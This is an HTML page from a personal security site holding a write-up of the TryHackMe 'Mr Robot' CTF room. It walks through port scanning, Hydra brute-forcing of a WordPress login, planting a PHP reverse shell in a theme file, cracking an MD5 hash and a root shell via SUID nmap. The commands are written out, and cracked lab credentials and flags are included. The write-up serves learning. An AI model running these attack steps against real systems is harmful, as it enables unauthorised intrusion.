@@ -1,0 +1,272 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Mr Robot CTF — WordPress to Root — writeup · 0xmrerror</title>
+  <meta name="description" content="A WordPress blog with a leaked wordlist, weak credentials and a hidden base64 login — a four-stage chain from recon to root." />
+  <link rel="canonical" href="https://0xmrerror.me/writeups/mr-robot/" />
+  <meta name="author" content="Skandar Hadrich" />
+  <meta name="theme-color" content="#080b10" />
+
+  <meta property="og:type" content="article" />
+  <meta property="og:site_name" content="0xmrerror.me" />
+  <meta property="og:title" content="Mr Robot CTF — WordPress to Root — writeup · 0xmrerror" />
+  <meta property="og:description" content="A WordPress blog with a leaked wordlist, weak credentials and a hidden base64 login — a four-stage chain from recon to root." />
+  <meta property="og:url" content="https://0xmrerror.me/writeups/mr-robot/" />
+  <meta property="og:image" content="https://0xmrerror.me/assets/og.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:locale" content="en" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Mr Robot CTF — WordPress to Root — writeup · 0xmrerror" />
+  <meta name="twitter:description" content="A WordPress blog with a leaked wordlist, weak credentials and a hidden base64 login — a four-stage chain from recon to root." />
+  <meta name="twitter:image" content="https://0xmrerror.me/assets/og.png" />
+
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+  <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+
+  <link rel="preload" href="/fonts/inter-400-700.woff2" as="font" type="font/woff2" crossorigin />
+  <link rel="preload" href="/fonts/fira-code-400.woff2" as="font" type="font/woff2" crossorigin />
+  <link rel="stylesheet" href="/fonts/fonts.css" />
+  <link rel="stylesheet" href="/css/tokens.css" />
+  <link rel="stylesheet" href="/css/base.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/components.css" />
+  <link rel="stylesheet" href="/css/writeups.css" media="all" />
+  <link rel="stylesheet" href="/css/print.css" media="print" />
+  <script>
+(function(){var d=document.documentElement;d.classList.add('js');
+try{var t=localStorage.getItem('0xmrerror:theme');
+if(!t||t==='auto'){t=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';}
+d.dataset.theme=t;var a=localStorage.getItem('0xmrerror:accent');if(a){d.dataset.accent=a;}
+var p=localStorage.getItem('0xmrerror:theme');if(p&&p!=='auto'){d.dataset.theme=p;}}catch(e){}})();
+</script>
+    <script type="application/ld+json">{
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "Mr Robot CTF \u2014 WordPress to Root",
+    "description": "A WordPress blog with a leaked wordlist, weak credentials and a hidden base64 login \u2014 a four-stage chain from recon to root.",
+    "url": "https://0xmrerror.me/writeups/mr-robot/",
+    "author": {
+      "@type": "Person",
+      "name": "Skandar Hadrich",
+      "url": "https://0xmrerror.me"
+    },
+    "keywords": "Web, Medium, thm, wordpress, credential-reuse, base64, privilege-escalation, tryhackme",
+    "proficiencyLevel": "medium"
+  }</script>
+</head>
+<body>
+<a class="skip-link" href="#main">Skip to content</a>
+
+<div class="read-progress" data-read-progress aria-hidden="true"><i></i></div>
+
+<aside class="rail" aria-label="Section navigation">
+  <div class="rail-logo">0xmrerror<small>@hadrich</small></div>
+  <ul class="rail-nav" data-rail-nav>
+    <li><a class="rail-link" data-nav-link href="/#whoami">whoami</a></li><li><a class="rail-link" data-nav-link href="/#skills">skills</a></li><li><a class="rail-link" data-nav-link href="/#projects">projects</a></li><li><a class="rail-link" data-nav-link href="/#writeups">writeups</a></li><li><a class="rail-link" data-nav-link href="/#contact">contact</a></li>
+  </ul>
+  <div class="rail-progress" aria-hidden="true"><i></i></div>
+  <div class="rail-meta">
+    Tunis, Tunisia<br />
+    <span class="accent">available</span> — Feb 2027<br />
+    <a href="https://github.com/skandarhadrich-cell" rel="noopener">github</a> ·
+    <a href="https://linkedin.com/in/skandar-hadrich-128221369" rel="noopener">linkedin</a><br />
+    <button class="btn btn--sm btn--ghost" type="button" data-accent-toggle
+      style="margin-top:var(--sp-3);font-size:var(--fs-3xs);padding:4px 9px">accent</button>
+    <button class="btn btn--sm btn--ghost" type="button" data-theme-toggle data-theme-pref="auto"
+      style="font-size:var(--fs-3xs);padding:4px 9px">theme</button>
+  </div>
+</aside>
+<!-- palette entries (hidden, read by js/main.js) -->
+<ul class="sr-only" aria-hidden="true"><li class="palette-item" data-palette-item="whoami" data-palette-hint="section" data-palette-kind="section" href="/#whoami"></li><li class="palette-item" data-palette-item="skills" data-palette-hint="section" data-palette-kind="section" href="/#skills"></li><li class="palette-item" data-palette-item="projects" data-palette-hint="section" data-palette-kind="section" href="/#projects"></li><li class="palette-item" data-palette-item="writeups" data-palette-hint="section" data-palette-kind="section" href="/#writeups"></li><li class="palette-item" data-palette-item="contact" data-palette-hint="section" data-palette-kind="section" href="/#contact"></li><li class="palette-item" data-palette-item="Mr Robot CTF — WordPress to Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/mr-robot/"></li><li class="palette-item" data-palette-item="WWBuddy — SQLi to Env-Var Privesc" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/ww-buddy/"></li><li class="palette-item" data-palette-item="Broker — MQTT Eavesdrop to Webshell" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/broker/"></li><li class="palette-item" data-palette-item="Watcher — LFI to Root in 7 Flags" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/watcher/"></li><li class="palette-item" data-palette-item="Fortress — SHA-1 Collision to Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/fortress/"></li><li class="palette-item" data-palette-item="Umbrella — Registry Loot to SUID Bash" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/umbrella/"></li><li class="palette-item" data-palette-item="Super Secret Tip — Jinja SSTI to curl -K Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/super-secret-tip/"></li><li class="palette-item" data-palette-item="Smol — WP Plugin SSRF to sudo Bash" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/smol/"></li><li class="palette-item" data-palette-item="WinAntiDbg0x200 — Three Anti-Debug Checks" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/winantidbg0x200/"></li><li class="palette-item" data-palette-item="WinAntiDbg0x300 — UPX, a Watchdog, and an Infinite Loop" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/winantidbg0x300/"></li><li class="palette-item" data-palette-item="Binary Instrumentation 2 — Intercepting File Writes With Frida" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/binary-instrumentation-2/"></li><li class="palette-item" data-palette-item="Easy as GDB — Scripted Character-by-Character Brute Force" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/easy-as-gdb/"></li><li class="palette-item" data-palette-item="Keygenme — MD5 Hex Spliced Into a License Key" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/keygenme/"></li></ul>
+<nav id="nav" aria-label="Primary">
+  <div class="nav-inner">
+    <a class="nav-logo" href="/">0xmrerror<span>@terminal</span></a>
+    <ul class="nav-links" id="navLinks">
+      <li><a data-nav-link href="/#whoami">whoami</a></li><li><a data-nav-link href="/#skills">skills</a></li><li><a data-nav-link href="/#projects">projects</a></li><li><a data-nav-link href="/#writeups">writeups</a></li><li><a data-nav-link href="/#contact">contact</a></li>
+    </ul>
+    <div class="nav-actions">
+      <a class="btn btn--sm nav-cv" href="/cv.html">cv</a>
+      <button class="btn btn--icon btn--ghost" type="button" data-theme-toggle
+        data-theme-pref="auto" aria-label="Theme: system" title="Toggle theme">
+        <span aria-hidden="true">◐</span>
+      </button>
+      <button class="nav-toggle" id="navToggle" type="button"
+        aria-label="Toggle menu" aria-expanded="false" aria-controls="navLinks">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+  </div>
+</nav>
+
+<main id="main" class="wu">
+  <div class="container">
+    <a class="wu-back" href="/"><span aria-hidden="true">←</span> 0xmrerror@terminal:~/writeups</a>
+
+    <div class="wu-head">
+      <h1>Mr Robot CTF — WordPress to Root</h1>
+      <p class="wu-summary">A WordPress blog with a leaked wordlist, weak credentials and a hidden base64 login — a four-stage chain from recon to root.</p>
+      <div class="wu-meta">
+        <span class="badge-diff" data-diff="medium">Medium</span><span class="badge-platform" data-platform="thm">TryHackMe</span><span class="writeup-time">Web · 20 min read</span><a class="tag" href="/?type=web#writeups">wordpress</a><a class="tag" href="/?type=web#writeups">credential-reuse</a><a class="tag" href="/?type=web#writeups">base64</a><a class="tag" href="/?type=web#writeups">privilege-escalation</a><a class="tag" href="/?type=web#writeups">tryhackme</a>
+        <button class="flag-toggle" type="button" data-flag-toggle aria-pressed="false">🚩 hide flags</button>
+      </div>
+      <div class="series"><span>more web</span><a href="/writeups/mr-robot/" class="is-current">Mr Robot CTF</a><a href="/writeups/ww-buddy/">WWBuddy</a><a href="/writeups/broker/">Broker</a><a href="/writeups/watcher/">Watcher</a><a href="/writeups/fortress/">Fortress</a><a href="/writeups/umbrella/">Umbrella</a><a href="/writeups/super-secret-tip/">Super Secret Tip</a><a href="/writeups/smol/">Smol</a></div>
+    </div>
+
+    <div class="wu-layout">
+      <article class="prose" data-article>
+<p>A WordPress blog with a leaked wordlist, weak credentials, a hidden base64 login, and the classic SUID <code>nmap</code> privesc. Goal: 3 keys.</p>
+
+<h3>1 · Reconnaissance</h3>
+<pre><code><span class="tok-comment"># Full port scan with services</span>
+<span class="tok-func">nmap</span> -sC -sV -p- --min-rate 1000 10.10.x.x
+
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https</code></pre>
+
+<h3>2 · Key 1 — robots.txt</h3>
+<p><code>robots.txt</code> leaks two files: the first key and <code>fsocity.dic</code>, a wordlist we reuse later.</p>
+<pre><code><span class="tok-func">curl</span> http://10.10.x.x/robots.txt
+
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+
+<span class="tok-func">wget</span> http://10.10.x.x/key-1-of-3.txt
+<span class="tok-func">cat</span> key-1-of-3.txt
+073403c8a58a1f80d943455fb30724b9</code></pre>
+
+<h3>3 · WordPress Enumeration</h3>
+<pre><code><span class="tok-func">gobuster</span> dir -u http://10.10.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+/wp-login   (Status: 200)
+/wp-admin   (Status: 301)
+/wp-content (Status: 301)
+
+<span class="tok-comment"># fsocity.dic has ~858k words, mostly duplicates — dedup first</span>
+<span class="tok-func">sort</span> fsocity.dic | <span class="tok-func">uniq</span> &gt; fs-clean.txt
+<span class="tok-func">wc</span> -w fs-clean.txt   <span class="tok-comment"># 11451 unique words</span></code></pre>
+
+<h3>4 · Brute-Forcing wp-login</h3>
+<p>WordPress leaks whether a username exists (<code>Invalid username</code> vs wrong-password message). Find the user first, then crack the password with Hydra.</p>
+<pre><code><span class="tok-comment"># 1) Find the username</span>
+<span class="tok-func">hydra</span> -L fs-clean.txt -p test 10.10.x.x http-post-form   "/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=Invalid username" -t 30
+<span class="tok-comment"># &gt; username: elliot</span>
+
+<span class="tok-comment"># 2) Crack the password</span>
+<span class="tok-func">hydra</span> -l elliot -P fs-clean.txt 10.10.x.x http-post-form   "/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=The password you entered for the username" -t 30
+<span class="tok-comment"># &gt; creds: elliot : ER28-0652</span></code></pre>
+<p><strong>Fast path:</strong> the <code>/license</code> page hides base64 that decodes straight to the same creds.</p>
+<pre><code><span class="tok-func">echo</span> ZWxsaW90OkVSMjgtMDY1Mgo= | <span class="tok-func">base64</span> -d
+<span class="tok-comment"># elliot:ER28-0652</span></code></pre>
+
+<h3>5 · Reverse Shell via Theme Editor</h3>
+<p>Logged in as admin, inject a PHP reverse shell into the theme: <strong>Appearance → Editor → 404.php</strong>. Paste pentestmonkey's shell, set your IP/port, save, then hit the template. Upgrade the dumb shell to a TTY.</p>
+<pre><code><span class="tok-comment"># Attacker side — listener</span>
+<span class="tok-func">nc</span> -lvnp 4444
+
+<span class="tok-comment"># Trigger the shell</span>
+http://10.10.x.x/wp-content/themes/twentyfifteen/404.php
+
+<span class="tok-comment"># Upgrade TTY</span>
+<span class="tok-func">python</span> -c <span class="tok-string">'import pty; pty.spawn("/bin/bash")'</span></code></pre>
+
+<h3>6 · Pivot to the robot User</h3>
+<p>Shell lands as <code>daemon</code>. <code>/home/robot</code> holds a hash file for the robot user and the key — readable only by robot.</p>
+<pre><code><span class="tok-func">cd</span> /home/robot && <span class="tok-func">ls</span> -la
+-r-------- 1 robot robot 33 key-2-of-3.txt
+-rw-r--r-- 1 robot robot 39 password.raw-md5
+
+<span class="tok-func">cat</span> password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+
+<span class="tok-func">john</span> hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
+<span class="tok-comment"># robot : abcdefghijklmnopqrstuvwxyz</span>
+
+<span class="tok-func">su</span> robot
+<span class="tok-func">cat</span> /home/robot/key-2-of-3.txt
+822c73956184f694993bebb3eb32f0bf</code></pre>
+
+<h3>7 · Privesc — SUID Nmap</h3>
+<p>A GTFOBins classic. Old nmap ships an <code>--interactive</code> shell where <code>!</code> runs commands as the binary owner — and <code>/usr/local/bin/nmap</code> has the SUID bit.</p>
+<pre><code><span class="tok-func">find</span> / -perm -u=s -type f 2&gt;/dev/null
+/usr/local/bin/nmap   <span class="tok-comment"># &lt;-- SUID, owned by root</span>
+
+/usr/local/bin/nmap --interactive
+nmap&gt; !sh
+<span class="tok-comment"># root shell</span>
+<span class="tok-func">cat</span> /root/key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4</code></pre>
+
+<h3>8 · Retrospective</h3>
+<p>Attack chain: <code>robots.txt</code> leak → WordPress weak creds → theme-editor shell → MD5 crack → SUID nmap. Key lessons: never ship wordlists publicly, watch for username-oracle login pages, and audit SUID binaries.</p>
+
+      </article>
+
+      <aside class="toc" data-toc-wrap>
+        <nav class="toc" data-toc aria-label="On this page">
+          <h2>on this page</h2>
+        </nav>
+      </aside>
+    </div>
+
+    <nav class="wu-nav" aria-label="More writeups">
+      
+      <a class="next" href="/writeups/ww-buddy/"><small>next →</small><span>WWBuddy — SQLi to Env-Var Privesc</span></a>
+    </nav>
+  </div>
+</main>
+
+<footer class="site-footer">
+  <div class="container">
+    <div class="footer-inner">
+      <div class="footer-prompt">
+        <b>0xmrerror</b>@terminal:~$ <span aria-hidden="true">█</span>
+        <p class="footer-note">Hosted on GitHub Pages. Built with no framework, no build server, no trackers.</p>
+      </div>
+      <div class="footer-cols">
+        <div class="footer-col">
+          <h4>site</h4>
+          <ul>
+            <li><a href="/">home</a></li>
+            <li><a href="/#writeups">writeups</a></li>
+            <li><a href="/cv.html">cv</a></li>
+            <li><a href="/feed.xml">rss</a></li>
+            <li><a href="/sitemap.xml">sitemap</a></li>
+          </ul>
+        </div>
+        <div class="footer-col">
+          <h4>elsewhere</h4>
+          <ul>
+            <li><a href="https://github.com/skandarhadrich-cell" rel="noopener">github</a></li>
+            <li><a href="https://linkedin.com/in/skandar-hadrich-128221369" rel="noopener">linkedin</a></li>
+            <li><a href="mailto:skandar.hadrich@etudiant.enit.utm.tn">email</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="footer-base">
+      <span>© 2026 Skandar Hadrich · MIT licensed</span>
+      <span>since <span data-since="2026-02-09" data-since-prefix="">—</span> on GitHub</span>
+    </div>
+  </div>
+</footer>
+<div class="palette" id="palette" role="dialog" aria-modal="true" aria-label="Command palette">
+  <div class="palette-box">
+    <input class="palette-input" id="paletteInput" type="text" placeholder="jump to a section or search writeups…"
+      autocomplete="off" spellcheck="false" aria-label="Search sections and writeups" />
+    <ul class="palette-list" id="paletteList" role="listbox" aria-label="Results"></ul>
+    <div class="palette-foot">
+      <span><b>↑↓</b> navigate</span><span><b>↵</b> open</span><span><b>esc</b> close</span>
+    </div>
+  </div>
+</div>
+<script src="/js/main.js" defer></script>
+<script src="/js/writeups.js" defer></script>
+</body>
+</html>
